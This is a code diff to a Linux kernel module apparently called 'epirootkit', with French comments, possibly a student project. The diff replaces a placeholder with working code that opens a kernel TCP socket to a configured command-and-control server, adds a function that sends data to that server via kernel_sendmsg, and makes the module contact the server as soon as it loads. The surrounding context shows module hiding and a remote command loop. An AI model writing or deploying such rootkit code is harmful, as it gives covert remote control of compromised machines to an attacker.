@@ -66,11 +66,57 @@ static void unhide_module(void) {
     }
 }
 
-// Implémentation minimale pour compilation
 static int connect_to_c2_server(void) {
-    pr_info("epirootkit: Dummy connect_to_c2_server called\n");
-    return 0; // succès factice
+    struct sockaddr_in server;
+    int err;
+
+    err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
+    if (err < 0) {
+        pr_err("epirootkit: socket creation failed (%d)\n", err);
+        return err;
+    }
+
+    memset(&server, 0, sizeof(server));
+    server.sin_family = AF_INET;
+    server.sin_port = htons(config.port);
+    server.sin_addr.s_addr = in_aton(config.server_ip);
+
+    err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server,
+                               sizeof(server), O_NONBLOCK);
+    if (err && err != -EINPROGRESS) {
+        pr_err("epirootkit: connect failed (%d)\n", err);
+        sock_release(g_sock);
+        g_sock = NULL;
+        return err;
+    }
+
+    pr_info("epirootkit: Connected to C2 server at %s:%d\n",
+            config.server_ip, config.port);
+
+    return 0;
 }
+
+static int send_to_c2(const char *msg, size_t len) {
+    struct kvec iov;
+    struct msghdr msg_hdr = {0};
+    int sent;
+
+    if (!g_sock)
+        return -ENOTCONN;
+
+    iov.iov_base = (char *)msg;
+    iov.iov_len = len;
+
+    sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
+    if (sent < 0) {
+        pr_err("epirootkit: failed to send data (%d)\n", sent);
+        return sent;
+    }
+
+    pr_info("epirootkit: sent %d bytes to C2\n", sent);
+    return 0;
+}
+
 
 // Implémentation minimale pour compilation
 static int command_loop(void *data) {
@@ -107,6 +153,7 @@ static int __init epirootkit_init(void) {
     }
 
     notify_connection_state(1);
+    send_to_c2("Comment aimez-vous votre blanquette ?\n", 6);
     return 0;
 }
 
